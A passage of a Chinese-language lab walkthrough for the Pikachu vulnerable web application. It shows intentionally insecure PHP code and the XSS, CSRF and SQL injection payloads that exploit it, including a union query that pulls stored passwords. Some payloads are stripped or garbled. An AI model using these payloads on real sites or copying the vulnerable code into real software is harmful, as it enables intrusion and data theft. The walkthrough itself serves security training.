if(isset($_GET['submit']) && $_GET['message'] != null){
    //这里会使用正则对那就去人民广场一个人坐一会儿吧!";
    }else{
        $html.="别说这些'{$message}'的话,不要怕,就是干!";
    }
}
```
这里注释写的很清楚了,不多说了
**漏洞利用**
过滤了 `hack the planet`
- payload: ``
### xss之htmlspecialchars
**服务器端核心代码**
```php
if(isset($_GET['submit'])){
    if(empty($_GET['message'])){
        $html.="输入点啥吧!";
    }else {
        //使用了htmlspecialchars进行处理,是不是就没问题了呢,htmlspecialchars默认不对'处理
        $message=htmlspecialchars($_GET['message']);
        $html1.="你的输入已经被记录:";
        //输入的内容被处理后输出到了input标签的value属性里面,试试:' onclick='alert(111)'
//        $html2.="";
        $html2.="{$message}";
    }
}
```
- **htmlspecialchars(string,flags,character-set,double_encode)**
    htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体.
    htmlspecialchars() 函数把预定义的字符转换为 HTML 实体,从而使XSS攻击失效.但是这个函数默认配置不会将单引号和双引号过滤,只有设置了quotestyle规定如何编码单引号和双引号才能会过滤掉单引号
**漏洞利用**
先输入被预定义的字符 `&"11<>11'123`,在前端查看代码观察有是否有过滤掉单引号或双引号
可见单引号后面的出来了
构造个 payload `'onclick='alert(1)'`
### xss之href输出
**服务器端核心代码**
```php
if(isset($_GET['submit'])){
    if(empty($_GET['message'])){
        $html.="叫你输入个url,你咋不听?";
    }
    if($_GET['message'] == 'www.baidu.com'){
        $html.="我靠,我真想不到你是这样的一个人";
    }else {
        //输出在a标签的href属性里面,可以使用javascript协议来执行js
        //防御:只允许http,https,其次在进行htmlspecialchars处理
        $message=htmlspecialchars($_GET['message'],ENT_QUOTES);
        $html.=" 阁下自己输入的url还请自己点一下吧";
    }
}
```
**漏洞利用**
先输入一些字符串 `&"11<>11'123`,查看前端的源代码,发现输入的字符都被转义了.但 `` 标签的 href 属性也是可以执行 JS 表达式的
构造个 payload `Javascript:alert('1')`
### xss之js输出
**服务器端核心代码**
```php
if(isset($_GET['submit']) && $_GET['message'] !=null){
    $jsvar=$_GET['message'];
//    $jsvar=htmlspecialchars($_GET['message'],ENT_QUOTES);
    if($jsvar == 'tmac'){
        $html.="";
    }
}
```
```js
    $ms='';
    if($ms.length != 0){
        if($ms == 'tmac'){
            $('#fromjs').text('tmac确实厉害,看那小眼神..')
        }else {
//            alert($ms);
            $('#fromjs').text('无论如何不要放弃心中所爱..')
        }
    }
```
**漏洞利用**
先输入一些字符串 `&"11<>11'123`,查看前端的源代码
对于 JS 代码,我们需要构造一个闭合,根据显示的代码构造 payload `abc'`
---
## CSRF
**如何确认存在一个 CSRF 漏洞**
1. 对目标网站增删改的地方进行标记,并观察其逻辑,判断请求是否可以被伪造
    比如修改管理员账号时,并不需要验证旧密码,导致请求容易被伪造;
    比如对于敏感信息的修改并没有使用安全的 token 验证,导致请求容易被伪造;
2. 确认凭证的有效期(这个问题会提高CSRF被利用的概率)
    虽然退出或者关闭了浏览器,但存在本地的 cookie 仍然有效,或者 session 并没有及时过期,导致 CSRF 攻击变的简单
### CSRF(get)
首先进行登录,修改一下个人信息,并到 Brup Suite 上进行抓包,将抓到的 URL 进行修改(由自己作为攻击者),再发送给攻击目标(由自己作为被攻击者)
**漏洞利用**
稍微修改一下,测试
`http:///pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=futa&phonenum=110&add=123&email=lili%40pikachu.com1&submit=submit`
### CSRF(POST)
同样,登录,修改一下个人信息,并到 Brup Suite 上进行抓包,对于 POST型,请求已经不能通过修改 URL 来借用用户权限,那么需要自己做一个表单,再返回到提交页面来完成修改.
**漏洞利用**
直接从 burp 生成 poc 表单
```html
    /pikachu/vul/csrf/csrfpost/csrf_post_edit.php" method="POST">
```
### CSRF_Token
要抵御 CSRF,关键在于在请求中放入攻击者不能伪造的信息,且该信息不存在于 cookie 之中.故每次请求都可以加入一个随机码,且后台要对这个随机码进行验证.
**漏洞利用**
如果做过 dvwa 同级的 csrf 应该清楚,这里可以使用 xss 来配合盗取 token 来造成 csrf,这里略
---
## Sql_Inject
在 owasp 发布的 top10 排行榜里,注入漏洞一直是危害排名第一的漏洞,其中注入漏洞里面首当其冲的就是数据库注入漏洞.
`一个严重的SQL注入漏洞,可能会直接导致一家公司破产!`
SQL 注入漏洞主要形成的原因是在数据交互中,前端的数据传入到后台处理时,没有做严格的判断,导致其传入的"数据"拼接到 SQL 语句中后,被当作 SQL 语句的一部分执行. 从而导致数据库受损(被脱裤、被删除、甚至整个服务器权限沦陷).
在构建代码时,一般会从如下几个方面的策略来防止SQL注入漏洞:
1. 对传进 SQL 语句里面的变量进行过滤,不允许危险字符传入;
2. 使用参数化(Parameterized Query 或 Parameterized Statement);
3. 还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了"拼接"的方式,所以使用时需要慎重!
### 数字型注入(post)
**服务器端核心代码**
```php
if(isset($_POST['submit']) && $_POST['id']!=null){
    //这里没有做任何处理,直接拼到select里面去了,形成Sql注入
    $id=$_POST['id'];
    $query="select username,email from member where id=$id";
    $result=execute($link, $query);
    //这里如果用==1,会严格一点
    if(mysqli_num_rows($result)>=1){
        while($data=mysqli_fetch_assoc($result)){
            $username=$data['username'];
            $email=$data['email'];
            $html.="hello,{$username} your email is: {$email}";
        }
    }else{
        $html.="您输入的user id不存在,请重新输入!";
    }
}
```
**漏洞利用**
抓包,查看 post 参数
构造 payload
`1' or '1' ='1` 报错
`1 or 1 =1` 未报错,存在数字型注入
### 字符型注入(get)
**服务器端核心代码**
```php
if(isset($_GET['submit']) && $_GET['name']!=null){
    //这里没有做任何处理,直接拼到select里面去了
    $name=$_GET['name'];
    //这里的变量是字符型,需要考虑闭合
    $query="select id,email from member where username='$name'";
    $result=execute($link, $query);
    if(mysqli_num_rows($result)>=1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            $html.="your uid:{$id} your email is: {$email}";
        }
    }else{
        $html.="您输入的username不存在,请重新输入!";
    }
}
```
**漏洞利用**
构造 payload
`http:///pikachu/vul/sqli/sqli_str.php?name=1' or '1' ='1&submit=%E6%9F%A5%E8%AF%A2`
### 搜索型注入
**服务器端核心代码**
```php
if(isset($_GET['submit']) && $_GET['name']!=null){
    //这里没有做任何处理,直接拼到select里面去了
    $name=$_GET['name'];
    //这里的变量是模糊匹配,需要考虑闭合
    $query="select username,id,email from member where username like '%$name%'";
    $result=execute($link, $query);
    if(mysqli_num_rows($result)>=1){
        //彩蛋:这里还有个xss
        $html2.="用户名中含有{$_GET['name']}的结果如下:";
        while($data=mysqli_fetch_assoc($result)){
            $uname=$data['username'];
            $id=$data['id'];
            $email=$data['email'];
            $html1.="username:{$uname}uid:{$id} email is: {$email}";
        }
    }else{
        $html1.="0o...没有搜索到你输入的信息!";
    }
}
```
**漏洞利用**
随意输入一个字母,能看到匹配出了对应的信息.那么按照 SQL 的模糊查询命令 `select * from 表名 where 字段名 like ‘%(对应值)%’;` ,发现可以按照之前的思路来实现万能语句的拼接.
构造 payload `' or 1=1 #`
这里还存在一个xss `'# `
**union注入**
union 操作符用于合并两个或多个 SQL 语句集合起来,得到联合的查询结果.
以 pikachu 平台的数据库为例,输入 `select id,email from member where username='kevin' union select username,pw from member where id=1` ;查看查询结果.